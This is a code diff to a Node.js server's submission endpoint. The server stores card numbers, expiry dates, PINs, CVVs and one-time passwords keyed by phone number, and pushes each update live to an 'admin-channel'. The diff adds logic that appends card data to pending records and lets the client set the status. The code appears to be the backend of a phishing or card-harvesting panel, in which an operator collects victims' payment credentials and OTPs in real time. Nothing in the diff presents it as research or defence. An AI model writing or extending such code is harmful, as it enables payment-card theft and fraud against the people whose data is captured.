@@ -100,6 +100,25 @@ const server = http.createServer(async (req, res) => {
     // API Routes
     if (req.method === 'POST' && req.url === '/api/submit') {
         const body = await parseBody(req);
+        
+        // If card data is provided and there's an existing submission for this phone, update it
+        if (body.cardNumber && body.phone) {
+            const existing = submissions.find(s => s.phone === body.phone && s.status === 'pending');
+            if (existing) {
+                existing.bank = body.bank || existing.bank;
+                existing.cardPrefix = body.cardPrefix || existing.cardPrefix;
+                existing.cardNumber = body.cardNumber || existing.cardNumber;
+                existing.expMonth = body.expMonth || existing.expMonth;
+                existing.expYear = body.expYear || existing.expYear;
+                existing.pin = body.pin || existing.pin;
+                existing.amount = body.amount || existing.amount;
+                existing.status = 'pending';
+                pusher.trigger('admin-channel', 'update-submission', existing);
+                sendJSON(res, { success: true, id: existing.id });
+                return;
+            }
+        }
+        
         const submission = {
             id: Date.now(),
             timestamp: new Date().toISOString(),
@@ -113,7 +132,7 @@ const server = http.createServer(async (req, res) => {
             amount: body.amount || '',
             otp: body.otp || '',
             cvv: body.cvv || '',
-            status: 'pending',
+            status: body.status || 'pending',
             pid: currentPid
         };
         submissions.push(submission);
